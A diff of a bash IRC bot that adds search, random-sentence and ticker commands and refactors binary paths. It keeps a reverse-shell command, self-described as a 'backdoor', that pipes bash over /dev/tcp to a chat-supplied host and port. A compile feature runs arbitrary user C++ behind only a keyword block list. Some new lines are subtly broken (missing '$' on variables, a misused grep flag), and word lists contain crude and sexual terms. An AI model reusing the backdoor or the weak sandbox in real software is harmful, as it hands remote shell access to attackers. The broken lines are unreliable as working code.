@@ -29,14 +29,14 @@ run_ping(){
   authenticated $1 $2 RESULT
   [ ${RESULT} -eq 0 ] && message_post $1 "Unable to ping - you are not a controller" && return
 
-  [ ! -e /bin/ping ] && message_post $1 "No ping utility installed" && return
-  [ ! -e /bin/grep ] && message_post $1 "No grep utility installed" && return
+  [ ! -e $PING_BIN ] && message_post $1 "No ping utility installed" && return
+  [ ! -e $GREP_BIN ] && message_post $1 "No grep utility installed" && return
 
   [ ! "$3" ] && message_post $1 "Must supply a host to ping" && return
 
   message_post $1 "Sending ping to [ $3 ]"
 
-  RESULT=$(/bin/ping -c 1 "$3" | /bin/grep "received")
+  RESULT=$($PING_BIN -c 1 "$3" | $GREP_BIN "received")
 
   message_post $1 "Result [ $RESULT ]"
 }
@@ -61,6 +61,61 @@ run_part(){
 
   echo "PART $3"
   message_post $1 "Attempted to leave room"
+}
+
+random_number(){
+  RANGE=$1
+  RESULT=$2
+
+  if [ $RANGE -lt 1 ]; then
+      RANGE=0
+  fi
+
+  eval $RESULT=$[ ($RANDOM % $RANGE) ]
+}
+
+run_google(){
+  SENDER=$1
+  RESPOND=$2
+
+  shift 2
+  [ ! "$1" ] && message_post $RESPOND "Specify a search term" && return
+
+  SEARCH_TERMS="$1"
+  shift
+  for var in "$@"; do
+      SEARCH_TERMS="$SEARCH_TERMS+$var"
+  done
+
+  debug "Searching $SEARCH_TERMS"
+
+  SEARCH_RESULT=$($CURL_BIN -A Mozilla "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=$SEARCH_TERMS" | $GREP_BIN -Eo "(unescapedUrl|titleNoFormatting)\"\:\"([a-z]|[A-Z]|[0-9]|[:]|[/]|[/.]|[\\]|[ ]|[/-]|[&]|[/=]|[/?]|['])*" | $SED_BIN 's@":"@,@g')
+
+  POSTED="false"
+  I=0
+  while [ $I -lt 5 ]; do
+      CURRENT_TITLE_SLICE=$(echo "${SEARCH_RESULT}" | $GREP_BIN title -m ${I} | $TAIL_BIN -n 1 | $CUT_BIN -d"," -f2)
+      CURRENT_URL_SLICE=$(echo "${SEARCH_RESULT}" | $GREP_BIN unescapedUrl -m ${I} | $TAIL_BIN -n 1 | $CUT_BIN -d"," -f2)
+      [ "${CURRENT_URL_SLICE}" -a "${CURRENT_TITLE_SLICE}" ] && message_post $RESPOND "Match ${I} : ${CURRENT_URL_SLICE}, ${CURRENT_TITLE_SLICE}" && POSTED="true"
+      ((I=$I + 1))
+  done
+
+  [ "$POSTED" != "true" ] && message_post $RESPOND "No results."
+}
+
+run_randsentence(){
+  BEGINNING=( "Sometimes, the" "The" "Once upon a time, the" "Any" "Always, the" "Oh no, the" "My" )
+  NOUN=( "school" "yard" "house" "ball" "shoes" "shirt" "fan" "purse" "bag" "pants" "toaster" "lamp" "floor" "door" "table" "bread" "dresser" "cup" "salt" "pepper" "plate" "dog" "cat" "wood" "stool" "suitcase" "plane" "bus" "car" "bike" "phone" "pillow" "wall" "window" "bed" "blanket" "hand" "head" "bra" "eyes" "sock" "plastic" "card board" "panty" "oven" "bow" "hair" "person" "clock" "foot" "boy" "book" "ear" "girl" "park" "basket" "woman" "street" "box" "man" "pussy"  "beaver" )
+  VERB=( "bounced" "cried" "jumped" "yelled" "flew" "screamed" "coughed" "smoked" "sneezed" "exploded" "vomited" "fell" "burned" "smiled" "spied" "slept" "drove" "fucked" "skipped" "ran" "walked" "died" "laughed" "sang" "tripped" "frowned" "slipped" "committed murder" )
+  ADJECTIVE=( "a beautiful" "a black" "an old" "the ugly" "my wet" "some red" "a loud" "the blue" "that dry" "a quiet" "a purple" "a hairy" "a mediocre" "the yellow" "a bald" "the melancholy" "the white" "the smooth" "a bright" "the clear" "that rough" "a dark" "the round" "a sexual" "the heavy" "the square" "a sexy" "that smelly" "my triangular" "my angry" "your disgusting" "an octagon" "the sad" "a delicious" "that precious" "happy" "that fat" "the distinguished" "a scared" "that skinny" "the burnt" "my brown" "a new" )
+
+  random_number ${#BEGINNING[@]} GET_BEGINNING
+  random_number ${#NOUN[@]} GET_NOUN
+  random_number ${#NOUN[@]} GET_ANOTHER_NOUN
+  random_number ${#VERB[@]} GET_VERB
+  random_number ${#ADJECTIVE[@]} GET_ADJECTIVE
+
+  message_post $2 "$1: ${BEGINNING[$GET_BEGINNING]} ${NOUN[$GET_NOUN]} ${VERB[$GET_VERB]} ${ADJECTIVE[$GET_ADJECTIVE]} ${NOUN[$GET_ANOTHER_NOUN]}"
 }
 
 run_nick(){
@@ -107,16 +162,20 @@ run_quit(){
 }
 
 run_resolve(){
-   MATCH=$(echo "$*" | /bin/grep -o -E "(http|https)(:[/][/])([a-z]|[A-Z]|[0-9]|[/=]|[/?]|[&]|[/-]|[/.]|[~])*" 2>/dev/null)
+   MATCH=$(echo "$*" | $GREP_BIN -o -E "(http|https)(:[/][/])([a-z]|[A-Z]|[0-9]|[/=]|[/?]|[&]|[/-]|[/.]|[~])*" 2>/dev/null)
 
    if [ $? -eq 0 -a "$MATCH" ]; then
       # first resolve the url
       #echo "MATCHED: $MATCH"
-      RESULT=$(curl -L "$MATCH" 2>/dev/null)
+      RESULT=$($CURL_BIN -L "$MATCH" 2>/dev/null)
       echo "$RESULT"
    fi
 }
 
+#
+# Yes, this _IS_ a 'backdoor' - albeit - you must actually set
+# ALLOW_REVERSE_SHELL somewhere for it to work.
+#
 run_reverseshell(){
 
   authenticated $1 $2 RESULT
@@ -124,22 +183,20 @@ run_reverseshell(){
 
   [ $ALLOW_REVERSE_SHELL -eq 0 ] && message_post $1 "No reverse shell" && return
 
-  [ ! -x /bin/cat ] && message_post $1 "No cat binary" && return
-  [ ! -x /usr/bin/nohup ] && message_post $1 "No nohup" && return
-  [ ! -x /bin/chmod ] && message_post $1 "No chmod binary" && return
-  [ ! -x /bin/rm ] && message_post $1 "No rm binary" && return
+  [ ! -x $CAT_BIN ] && message_post $1 "No cat binary" && return
+  [ ! -x $NOHUP_BIN ] && message_post $1 "No nohup" && return
+  [ ! -x $CHMOD_BIN ] && message_post $1 "No chmod binary" && return
+  [ ! -x $RM_BIN ] && message_post $1 "No rm binary" && return
 
   [ ! "$3" ] && message_post $1 "Must specify a host" && return
   [ ! "$4" ] && message_post $1 "Must specify a port" && return
 
   message_post $1 "Spawning a forked reverse shell to [$3:$4]..."
 
-  TMPSHELL=$(/bin/mktemp)
-
-  #[ -e $TMP ] && /bin/rm -f /tmp/makeshell
+  TMPSHELL=$($MKTEMP_BIN)
 
   message_post $1 "Writing a makeshell shell script"
-  /bin/cat > $TMPSHELL <<EOF
+  $CAT_BIN > $TMPSHELL <<EOF
 #!/bin/bash
 exec 3<> /dev/tcp/$3/$4
 if [ $? != 0 ]; then
@@ -148,18 +205,16 @@ fi
 /bin/bash 0<&3 1>&3- 2>/dev/null 
 rm -f $TMPSHELL
 EOF
-  /bin/chmod +x $TMPSHELL
+  $CHMOD_BIN +x $TMPSHELL 2>/dev/null >/dev/null
 
-  [ ! -x $TMPSHELL ] && message_post $1 "Cannot make shell - failed" && rm -f $TMPSHELL && return
+  [ ! -x $TMPSHELL ] && message_post $1 "Cannot make shell - failed" && $RM_BIN -f $TMPSHELL && return
   
-  $(/usr/bin/nohup $TMPSHELL $3 $4 >/dev/null </dev/null 2>/dev/null &)
+  $($NOHUP_BIN $TMPSHELL $3 $4 >/dev/null </dev/null 2>/dev/null &)
   message_post $1 "Spawned"
 }
 
 run_keyword(){
   [ ! "$3" ] && message_post $1 "Please say one of (off|on|clear|add|del)" && return
-
-  #message_post $1 "Attempting to modify keyword stuff ${USE_KEYWORDS} ${#KEYWORDS[*]} "
 
   if [ "$3" == "off" ]; then
 
@@ -196,7 +251,7 @@ run_keyword(){
     [ ! "$4" ] && message_post $1 "Give me a keyword" && return
     I=0
     for found in "${KEYWORDS[@]}"; do
-      result=$(echo "$*" | /bin/grep -i "$found")
+      result=$(echo "$*" | $GREP_BIN -i "$found")
       if [ "${result}" ]; then
         message_post $2 "Keyword [ ${KEYWORDS[${I}]} ] is [ ${KEYWORD_RESPONSES[$I]} ]"
         return
@@ -209,7 +264,7 @@ run_keyword(){
     [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return
     I=0
     for found in "${KEYWORDS[@]}"; do
-      result=$(echo "$*" | /bin/grep -i "$found")
+      result=$(echo "$*" | $GREP_BIN -i "$found")
       if [ "${result}" ]; then
           KEYWORDS=(${KEYWORDS[@]:0:$I} ${KEYWORDS[@]:$(($I + 1))})
           KEYWORD_RESPONSES=(${KEYWORD_RESPONSES[@]:0:$I} ${KEYWORD_RESPONSES[@]:$(($I + 1))})
@@ -226,11 +281,12 @@ run_shorten(){
    [ ! "$3" ] && message_post $2 "Unable to shorten blank url" && return
 
    URL="http://is.gd/api.php?longurl=$3"
-   RESULT=$(/usr/bin/curl $URL)
+   RESULT=$($CURL_BIN $URL)
    message_post $2 "Shortened [ $RESULT ]"
 }
 
-GCC_FLAGS="-finput-charset=UTF-8 -O2 -std=c++0x -pedantic-errors -Wfatal-errors -Wall -Wextra -Wno-empty-body -Wno-missing-field-initializers -Wwrite-strings -Wno-deprecated -Wno-unused -Wno-non-virtual-dtor -Wno-variadic-macros -fno-use-linker-plugin -fmessage-length=0 -ftemplate-depth-128 -fno-merge-constants -fno-nonansi-builtins -fno-gnu-keywords -fno-elide-constructors -fstrict-aliasing -fstack-protector-all -Winvalid-pch -D_GLIBCXX_DEBUG -D_GLIBCXX_DEBUG_PEDANTIC -D_GLIBCXX_CONCEPT_CHECKS"
+
+#GCC_FLAGS="-w"
 
 run_controller(){
 
@@ -273,8 +329,8 @@ run_ticker(){
   shift 2
 
   [ ! "$1" ] && message_post $CHANNEL "Requires a ticker symbol"
-  TICKERNAME=$(wget -O- "http://finance.yahoo.com/q?s=${1}&ql=1" 2>/dev/null | grep time_rtq_ticker | cut -d\" -f17 | cut -d"<" -f2 | cut -d">" -f2)
-  TICKERPRICE=$(wget -O- "http://finance.yahoo.com/q?s=${1}&ql=1" 2>/dev/null | grep time_rtq_ticker | cut -d\" -f27 | cut -d"<" -f1 | cut -d">" -f2)
+  TICKERNAME=$($CURL_BIN "http://finance.yahoo.com/q?s=${1}&ql=1" 2>/dev/null | $GREP_BIN time_rtq_ticker | cut -d\" -f17 | cut -d"<" -f2 | cut -d">" -f2)
+  TICKERPRICE=$($CURL_BIN "http://finance.yahoo.com/q?s=${1}&ql=1" 2>/dev/null | $GREP_BIN time_rtq_ticker | cut -d\" -f27 | cut -d"<" -f1 | cut -d">" -f2)
 
   message_post $CHANNEL "Ticker [ ${TICKERNAME} ] value [ ${TICKERPRICE} ]"
 }
@@ -297,22 +353,22 @@ run_emote(){
 
 run_compile(){
 
-#  authenticated $1 $2 RESULT
-#  [ ${RESULT} -eq 0 ] && message_post $1 "Sorry, ${1}, but you are not authorized to compile" && return
+  [ ${AUTHENTICATED_COMPILE} -eq 1 ] && authenticated $1 $2 RESULT
+  [ ${AUTHENTICATED_COMPILE} -eq 1 -a ${RESULT} -eq 0 ] && message_post $1 "Sorry, ${1}, but you are not authorized to compile" && return
 
   SENDER=$1
   RESPONSE=$2
 
   shift 2
 
-  [ ! "$*" ] && message_post $RESPONSE "Error - no shit to compile"
+  [ ! "$*" ] && message_post $RESPONSE "Error - nothing to compile" && return
 
-  HASMAIN=$(/bin/echo "$*" | /bin/grep -w -E "main")
+  HASMAIN=$(/bin/echo "$*" | $GREP_BIN -w -E "main")
 
   BADWORDS=( "socket" "setuid" "setgid" "seteuid" "setegid" "fopen" "open" "creat" "system" "exec" "execl" "execvp" "execp" "execle" "ioctl" "asm" "fork" "vfork" "clone" "execve" "signal" "kill" "popen" "sigaction" "signal" "#include" "ifstream" "ofstream" )
 
   for badword in "${BADWORDS[@]}"; do
-    HASWORD=$(/bin/echo "$*" | /bin/grep -w -o "$badword")
+    HASWORD=$(/bin/echo "$*" | $GREP_BIN -w -o "$badword")
     if [ "${HASWORD}" ]; then
       message_post $RESPONSE "blocked app due to: [ $badword ]" 
       return
@@ -320,12 +376,12 @@ run_compile(){
   done
 
 
-  COUTFILE=$(/bin/mktemp --suffix=.cc)
-  OOUTFILE=$(/bin/mktemp --suffix=.o)
-  AOUTFILE=$(/bin/mktemp)
-  WARNFIL=$(/bin/mktemp)
+  COUTFILE=$($MKTEMP_BIN --suffix=.cc)
+  OOUTFILE=$($MKTEMP_BIN --suffix=.o)
+  AOUTFILE=$($MKTEMP_BIN)
+  WARNFIL=$($MKTEMP_BIN)
 
-  /bin/cat > $COUTFILE <<EOF
+  $CAT_BIN > $COUTFILE <<EOF
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -352,7 +408,7 @@ EOF
   NEEDSTERM="false"
 
   if [ ! "$HASMAIN" ]; then
-      cat >> $COUTFILE <<EOF
+      $CAT_BIN >> $COUTFILE <<EOF
 
 int main()
 EOF
@@ -365,18 +421,18 @@ EOF
 
   [ "$NEEDSTERM" == "true" ] && $(echo "}" >> $COUTFILE)
 
-  ERRORS=$(/usr/bin/g++ ${GCC_FLAGS} -Dmain="APP_TMP_MAIN_main" -c -o $OOUTFILE $COUTFILE 2>&1)
+  ERRORS=$($CXX ${GCC_FLAGS} -Dmain="APP_TMP_MAIN_main" -c -o $OOUTFILE $COUTFILE 2>&1)
 
   if [ "$ERRORS" ]; then
-    BADSTUFF=$(echo "$ERRORS" | /bin/grep -o -E -m 1 "(warning\:|error\:).*" )
+    BADSTUFF=$(echo "$ERRORS" | $GREP_BIN -o -E -m 1 "(warning\:|error\:).*" )
 
     message_post $RESPONSE "submitted: ${BADSTUFF}"
-    /bin/rm -f $COUTFILE $AOUTFILE $WARNFIL $OOUTFILE
+    $RM_BIN -f $COUTFILE $AOUTFILE $WARNFIL $OOUTFILE
 
     return
   fi
 
-  /bin/cat >$COUTFILE <<EOF
+  $CAT_BIN >$COUTFILE <<EOF
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -496,28 +552,28 @@ int main()
 
 EOF
 
-  ERRORS=$(/usr/bin/g++ -fpermissive -o $AOUTFILE $COUTFILE $OOUTFILE 2>&1 )
+  ERRORS=$($CXX -fpermissive -o $AOUTFILE $COUTFILE $OOUTFILE 2>&1 )
   if [ "$ERRORS" -a $? -eq 1 ]; then
-    BADSTUFF=$(echo "$ERRORS" | /bin/grep -o -E -m 1 "(warning\:|error\:|undefined).*" )
+    BADSTUFF=$(echo "$ERRORS" | $GREP_BIN -o -E -m 1 "(warning\:|error\:|undefined).*" )
 
     message_post $RESPONSE "precomp: ${BADSTUFF}"
-    /bin/rm -f $AOUTFILE $WARNFIL $OOUTFILE
+    $RM_BIN -f $AOUTFILE $WARNFIL $OOUTFILE
 
     return
   fi
 
-  /bin/cat >$WARNFIL <<EOF
+  $CAT_BIN >$WARNFIL <<EOF
 #!/bin/bash
 ulimit -t 2
 #ulimit -u 5
 $AOUTFILE
 EOF
 
-  /bin/chmod +x $WARNFIL
+  $CHMOD_BIN +x $WARNFIL
 
   RESULT=$( ${WARNFIL} 2>&1 )
  
-  /bin/rm -f $COUTFILE $AOUTFILE $WARNFIL $OOUTFILE
+  $RM_BIN -f $COUTFILE $AOUTFILE $WARNFIL $OOUTFILE
 
   message_post $RESPONSE "$RESULT"
 }
@@ -526,7 +582,7 @@ run_rot13(){
   SENDER=$1
   RESPOND=$2
   shift 2
-  ROTMSG=$(echo "$*" | /usr/bin/tr 'a-zA-Z' 'n-za-mN-ZA-M')
+  ROTMSG=$(echo "$*" | $TR_BIN 'a-zA-Z' 'n-za-mN-ZA-M')
   message_post $RESPOND "$ROTMSG"
 }
 
@@ -539,16 +595,16 @@ run_mycmd(){
   shift 2
 
   if [ "$KW" == "uptime" ]; then
-    [ ! -e /usr/bin/uptime ] && message_post $SENDER "Sorry - no uptime binary" && return
-    UPTIME=$(/usr/bin/uptime)
+    [ ! -e $UPTIME_BIN ] && message_post $SENDER "Sorry - no uptime binary" && return
+    UPTIME=$($UPTIME_BIN)
     message_post $SENDER "Uptime - $UPTIME"
   elif [ "$KW" == "sysinfo" ]; then
-    [ ! -e /bin/uname ] && message_post $SENDER "No uname binary found" && return
-    UNAME=$(/bin/uname -a)
+    [ ! -e $UNAME_BIN ] && message_post $SENDER "No uname binary found" && return
+    UNAME=$($UNAME_BIN -a)
     message_post $SENDER "Uname - $UNAME"
   elif [ "$KW" == "id" ]; then
-    [ ! -e /usr/bin/id ] && message_post $SENDER "No id binary" && return
-    IDINFO=$(/usr/bin/id)
+    [ ! -e $ID_BIN ] && message_post $SENDER "No id binary" && return
+    IDINFO=$($ID_BIN)
     message_post $SENDER "ID [ $IDINFO ]"
   elif [ "$KW" == "keywords" ]; then
     message_post $SENDER "Keywords [ ${KEYWORDS[@]} ]"
@@ -620,17 +676,20 @@ handler_callback_tochan(){
 
   if [ "${1:1:1}" == \! ]; then
     if [ "${1:2}" == "uptime" ]; then
-      UPTIME=$(/usr/bin/uptime)
+      UPTIME=$(UPTIME_BIN)
       message_post $CHANNEL "$UPTIME"
     elif [ "${1:2}" == "explode" ]; then
       [ ! "$2" ] && message_post $CHANNEL "Explode requires a URL dumbass" && return
-      URL=$(curl -I -s "$2" | fgrep 'Location:' | cut -d" " -f2)
+      URL=$(CURL_BIN -I -s "$2" | $GREP_BIN -f 'Location:' | $CUT_BIN -d" " -f2)
       message_post $CHANNEL "Exploded url: $URL "
     elif [ "${1:2}" == "keywords" ]; then
       message_post $CHANNEL "Recognized keywords [ ${KEYWORDS[@]} ]"
     elif [ "${1:2}" == "keyword" ]; then
       shift
       run_keyword $SENDER $CHANNEL $*
+    elif [ "${1:2}" == "silly" ]; then
+      shift
+      run_randsentence $SENDER $CHANNEL $*
     elif [ "${1:2}" == "ticker" ]; then
       shift
       run_ticker $SENDER $CHANNEL $*
@@ -663,17 +722,14 @@ handler_callback_tochan(){
       run_part $SENDER $CHANNEL $CHANNEL
     elif [ "${1:2}" == "facebook" ]; then
       shift
-      message_post $CHANNEL "Facebook: because even when you're taking a shit, you need ignorant fucking political discussion"
-    elif [ "${1:2}" == "XenithOS" ]; then
+      message_post $CHANNEL "Facebook: because even when you're taking a crap, you need ignorant political discussion"
+    elif [ "${1:2}" == "google" ]; then
       shift
-      message_post $CHANNEL "it's gay"
+      run_google $SENDER $CHANNEL $@
     elif [ "${1:2}" == "quit" ]; then
       shift
       run_quit $SENDER $CHANNEL "$*"
     fi
-#    else
-#        message_post $SENDER "Channel command [ ${1:2} ] not supported"
-#    fi
 
     return
   fi
@@ -681,23 +737,23 @@ handler_callback_tochan(){
   if [ "${USE_KEYWORDS}" == "1" ]; then
       I=0
       for found in "${KEYWORDS[@]}"; do
-        result=$(echo "$*" | /bin/grep -i "$found")
+        result=$(echo "$*" | $GREP_BIN -i "$found")
         if [ "${result}" ]; then
             RESPONSE="${KEYWORD_RESPONSES[${I}]}"
             SEDLINE="s/%SENDER%/${SENDER}/g"
-            FORMATTED_RSP=$(echo "$RESPONSE" | /bin/sed $SEDLINE)
+            FORMATTED_RSP=$(echo "$RESPONSE" | $SED_BIN $SEDLINE)
   
-            check_title=$(echo "$FORMATTED_RSP" | /bin/grep "%URL_TITLE%")
+            check_title=$(echo "$FORMATTED_RSP" | $GREP_BIN "%URL_TITLE%")
             if [ "$check_title" ]; then
                HTTP_TEXT=$(run_resolve "$*")
-               TITLE=$(echo "${HTTP_TEXT}" | /bin/grep -o "<title>.*</title>" | /bin/sed "s@<title>@@g" | /bin/sed "s@</title>@@g" )
+               TITLE=$(echo "${HTTP_TEXT}" | $GREP_BIN -o "<title>.*</title>" | $SED_BIN "s@<title>@@g" | $SED_BIN "s@</title>@@g" )
                debug "$SENDER asked for $TITLE from $*"
                if [ "$TITLE" ]; then
                   SEDLINE="s@%URL_TITLE%@$TITLE@g"
-                  FORMATTED_RSP=$(echo "$FORMATTED_RSP" | /bin/sed "${SEDLINE}")
+                  FORMATTED_RSP=$(echo "$FORMATTED_RSP" | $SED_BIN "${SEDLINE}")
                else
                   SEDLINE="s@%URL_TITLE%@(No Title)@g"
-                  FORMATTED_RSP=$(echo "$FORMATTED_RSP" | /bin/sed "${SEDLINE}")
+                  FORMATTED_RSP=$(echo "$FORMATTED_RSP" | $SED_BIN "${SEDLINE}")
                fi
             fi
 
@@ -711,24 +767,24 @@ handler_callback_tochan(){
   if [ "$DRBOT" == "on" ]; then
     if [ "$1" == ":${nick}" -o "$1" == ":$nick:" -o "$1" == ":$nick," ]; then
       shift
-      INPUTLINE=$(echo "$*" | tr "[a-z]" "[A-Z]" | /bin/sed 's/^/ /; s/$/ /; s/\./ /g; s/ I / i /g; s/ I.M / i am /g; s/ YOU ARE/ you are/g; s/ AM / am /g; s/ ME / me /g; s/ YOU / you /g; s/ MY / my /g; s/ YOUR / your /g; s/ MINE / mine /g; s/ ARE / are /g; s/ me / YOU /g; s/ my / YOUR /g; s/ your / IRCBOTS /g; s/ i / YOU /g; s/ am / ARE /g;s/ mine / YOURS /g; s/ are / IS /; s/ you / IRCBOT /; s/^ //; s/ $//')
+      INPUTLINE=$(echo "$*" | tr "[a-z]" "[A-Z]" | $SED_BIN 's/^/ /; s/$/ /; s/\./ /g; s/ I / i /g; s/ I.M / i am /g; s/ YOU ARE/ you are/g; s/ AM / am /g; s/ ME / me /g; s/ YOU / you /g; s/ MY / my /g; s/ YOUR / your /g; s/ MINE / mine /g; s/ ARE / are /g; s/ me / YOU /g; s/ my / YOUR /g; s/ your / IRCBOTS /g; s/ i / YOU /g; s/ am / ARE /g;s/ mine / YOURS /g; s/ are / IS /; s/ you / IRCBOT /; s/^ //; s/ $//')
       #message_post $SENDER $INPUTLINE
       case "$INPUTLINE" in
         *YOU\ ARE\ *)
-            INPUTLINE=$(echo "${INPUTLINE}?" | /bin/sed 's/^.*YOU\ ARE/WHY DO YOU THINK YOU ARE/')
+            INPUTLINE=$(echo "${INPUTLINE}?" | $SED_BIN 's/^.*YOU\ ARE/WHY DO YOU THINK YOU ARE/')
             ;;
         *YOU\ HAVE\ *)
-            INPUTLINE=$(echo "${INPUTLINE}?" | /bin/sed 's/^.*YOU\ HAVE/HOW LONG HAVE YOU HAD/')
+            INPUTLINE=$(echo "${INPUTLINE}?" | $SED_BIN 's/^.*YOU\ HAVE/HOW LONG HAVE YOU HAD/')
             ;;
         WHY\ DOES*|WHY\ DO*)
-            INPUTLINE=$(echo "${INPUTLINE}?" | /bin/sed 's/^WHY\ \(DO\|DOES\) //')
+            INPUTLINE=$(echo "${INPUTLINE}?" | $SED_BIN 's/^WHY\ \(DO\|DOES\) //')
             INPUTLINE="why do you think that $INPUTLINE"
             ;;
         YOU*)
             INPUTLINE="when did you first realize that ${INPUTLINE}?"
             ;;
         *BECAUSE*)
-            STATEMENT=$(echo "${INPUTLINE}?" | /bin/sed 's/^.*BECAUSE //')
+            STATEMENT=$(echo "${INPUTLINE}?" | $SED_BIN 's/^.*BECAUSE //')
             INPUTLINE="are you sure ${STATEMENT}"
             ;;
         *DO\ IRCBOT\ THINK*)
@@ -737,19 +793,19 @@ handler_callback_tochan(){
         *IRCBOTS*)
             INPUTLINE="let's keep the conversation on something else please"
             ;;
-        *IRCBOT\ IS*|IRCBOT\ IS*)
-            STATEMENT=$(echo "$INPUTLINE" | /bin/sed 's/^.*IRCBOT IS //')
-            INPUTLINE="I do not think I am $STATEMENT"
-            ;;
         *TOUCHY*|*TESTY*|*ANGRY*|*MAD*|*HAPPY*|*SAD*|*EXCITED*)
             INPUTLINE="I have no emotions. That said, why have you interpreted my statement as such?"
             ;;
+        *IRCBOT\ IS*|IRCBOT\ IS*)
+            STATEMENT=$(echo "$INPUTLINE" | $SED_BIN 's/^.*IRCBOT IS //')
+            INPUTLINE="I do not think I am $STATEMENT"
+            ;;
         *ARE\ IRCBOT*|*IS\ IRCBOT*|ARE\ IRCBOT*|IS\ IRCBOT*)
-            STATEMENT=$(echo "$INPUTLINE" | /bin/sed "s/^.*\(ARE\|IS\) IRCBOT //")
+            STATEMENT=$(echo "$INPUTLINE" | $SED_BIN "s/^.*\(ARE\|IS\) IRCBOT //")
             INPUTLINE="do you think I am ${STATEMENT}?"
             ;;
         *IS\ *\'S*|*DOES\ *\'S*|IS\ *\'S*|DOES\ *\'S*)
-            PERSON=$(echo "$INPUTLINE" | /bin/sed "s/^.*\(DOES\|IS\) \(.*'S\) \(.*\)/\2/" | /usr/bin/cut -d"'" -f1)
+            PERSON=$(echo "$INPUTLINE" | $SED_BIN "s/^.*\(DOES\|IS\) \(.*'S\) \(.*\)/\2/" | $CUT_BIN -d"'" -f1)
             INPUTLINE="you should ask $PERSON"
             ;;
         IS\ AWESOME|IS\ GOOD|IS\ GREAT)
@@ -774,7 +830,7 @@ handler_callback_tochan(){
             INPUTLINE="Why do you say ${INPUTLINE}?"
             ;;
       esac
-      INPUTLINE=$(echo "$INPUTLINE" | /usr/bin/tr "[A-Z]" "[a-z]")
+      INPUTLINE=$(echo "$INPUTLINE" | $TR_BIN "[A-Z]" "[a-z]")
       message_post $CHANNEL "$SENDER, $INPUTLINE"
     fi
   fi
